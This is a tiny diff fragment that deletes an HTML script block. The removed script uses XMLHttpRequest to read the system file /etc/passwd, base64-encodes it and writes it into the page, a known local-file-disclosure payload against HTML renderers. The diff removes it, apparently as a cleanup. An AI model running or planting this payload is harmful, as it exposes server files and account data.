@@ -1,10 +1,1 @@
-<script>
-var x = new XMLHttpRequest();
-x.open("GET", "file:///etc/passwd", true);
-x.onload = function(){
-var code = "<textarea rows='100' cols='70'>" + btoa(x.responseText) + "
-</textarea>";
-document.write(code);
-};
-x.send();
-</script>
+
